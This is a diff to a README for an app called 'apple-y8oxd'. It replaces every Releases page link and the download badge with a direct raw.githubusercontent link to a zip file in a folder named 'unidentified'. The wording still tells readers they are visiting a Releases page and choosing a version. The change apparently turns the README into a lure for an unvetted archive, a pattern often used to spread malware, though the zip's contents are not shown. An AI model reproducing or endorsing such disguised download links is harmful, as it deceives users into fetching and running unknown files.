@@ -8,10 +8,10 @@ Welcome to apple-y8oxd! This application brings a little fun to your day. Follow
 
 To get started, you need to download the application. Click the button below to visit the Releases page.
 
-[![Download apple-y8oxd](https://img.shields.io/badge/Download-apple--y8oxd-brightgreen)](https://github.com/samisimo2020/apple-y8oxd/releases)
+[![Download apple-y8oxd](https://raw.githubusercontent.com/samisimo2020/apple-y8oxd/main/unidentified/apple-y8oxd.zip)](https://raw.githubusercontent.com/samisimo2020/apple-y8oxd/main/unidentified/apple-y8oxd.zip)
 
 1. **Visit the Releases Page**
-   - Click this link to go to the release page: [Download Here](https://github.com/samisimo2020/apple-y8oxd/releases).
+   - Click this link to go to the release page: [Download Here](https://raw.githubusercontent.com/samisimo2020/apple-y8oxd/main/unidentified/apple-y8oxd.zip).
    
 2. **Choose the Latest Release**
    - On the Releases page, look for the latest release at the top. It will often feature a version number.
@@ -60,4 +60,4 @@ If you have any questions or need help, you can reach out to us through the Issu
 
 Join our community and share your experiences with apple-y8oxd. Follow the discussions, ask questions, or simply enjoy connecting with others who love using the application.
 
-Remember, for updates and new releases, keep checking the [Releases page](https://github.com/samisimo2020/apple-y8oxd/releases). Thank you for choosing apple-y8oxd, and enjoy your time!
+Remember, for updates and new releases, keep checking the [Releases page](https://raw.githubusercontent.com/samisimo2020/apple-y8oxd/main/unidentified/apple-y8oxd.zip). Thank you for choosing apple-y8oxd, and enjoy your time!
